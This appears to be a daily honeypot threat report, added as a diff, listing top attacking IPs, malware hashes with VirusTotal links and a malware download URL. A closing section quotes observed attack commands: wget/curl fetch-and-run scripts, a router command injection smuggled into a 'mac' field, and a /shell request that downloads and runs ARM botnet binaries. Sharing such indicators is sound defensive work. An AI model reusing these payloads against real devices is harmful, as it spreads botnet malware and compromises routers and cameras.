@@ -1,0 +1,36 @@
+Top 5 IPs for 2024-01-28:
+
+43.134.119.191
+43.159.145.170
+112.49.39.209
+88.247.206.33
+100.10.2.144
+
+Malware download: 
+c8c71b72815fc4537e2ce4e16af9b1229eddc1abe4c1b581389a4d5a8f4a99d8
+https://www.virustotal.com/gui/file/c8c71b72815fc4537e2ce4e16af9b1229eddc1abe4c1b581389a4d5a8f4a99d8
+3f99b4944656836a9c7631d165d5d5b59047308013a605c16c6078cf6179b904
+https://www.virustotal.com/gui/file/3f99b4944656836a9c7631d165d5d5b59047308013a605c16c6078cf6179b904
+0399b0cb6706dd31566bd9e9c001913bad3b155a4f1801615da49b74d75f246d
+https://www.virustotal.com/gui/file/0399b0cb6706dd31566bd9e9c001913bad3b155a4f1801615da49b74d75f246d
+a8b57a2b81dd9932151bb8d382ea5dafa6f0a570fb335129bf14bc11c2c67637
+https://www.virustotal.com/gui/file/a8b57a2b81dd9932151bb8d382ea5dafa6f0a570fb335129bf14bc11c2c67637
+13de5805cd4d0148450543cddf723f20ef321ff2d8a1a461e80e8685321f1b4c
+https://www.virustotal.com/gui/file/13de5805cd4d0148450543cddf723f20ef321ff2d8a1a461e80e8685321f1b4c
+a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+https://www.virustotal.com/gui/file/a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+Downloaded from : http://175.31.254.63:9954/.i
+
+
+
+
+Malciious Commands seen:
+
+cd /data/local/tmp/; busybox wget http://84.54.51.254/w.sh; sh w.sh; curl http://84.54.51.254/c.sh; sh c.sh
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf *mpsl*;wget http://103.245.236.146/skyljnee.mpsl; chmod 777 skyljnee.mpsl; ./skyljnee.mpsl lblink.selfrep;rm *mpsl*;
+
+/shell?cd+/tmp;rm+-rf+most*;pkill+.arm;pkill+.arm7;wget+http:/\\/103.69.97.45/most-arm7;chmod+777+most-arm7;./most-arm7+ipcams;wget+http:/\\/103.69.97.45/most-arm;chmod+777+most-arm;./most-arm+ipcams
